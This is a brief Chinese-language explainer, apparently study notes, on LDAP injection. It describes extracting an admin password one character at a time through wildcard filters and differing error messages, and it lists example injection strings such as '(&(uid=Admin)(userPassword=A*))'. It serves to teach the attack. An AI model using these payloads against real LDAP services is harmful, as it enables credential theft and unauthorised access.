	LDAP查询中使用的用户名缺乏对输入内容的过滤，允许构造恶意内容进行LDAP查询。通过使用通配符和通过观察不同的身份验证错误消息，攻击者可以逐字地搜索登录凭据，方法是逐个发送一行有意义的字符串去不断猜测。 
	XXX;(&(uid=Admin)(userPassword=A*))
	XXX;(&(uid=Admin)(userPassword=B*))
	XXX;(&(uid=Admin)(userPassword=C*))
	...
	XXX;(&(uid=Admin)(userPassword=s*))
	...
	XXX;(&(uid=Admin)(userPassword=se*))
	...
	XXX;(&(uid=Admin)(userPassword=sec*))
	...
	XXX;(&(uid=Admin)(userPassword=secretPassword))  这个并不是POC 而是方法 


	LDAP注入学习理解(http://www.cnblogs.com/bendawang/p/5156562.html)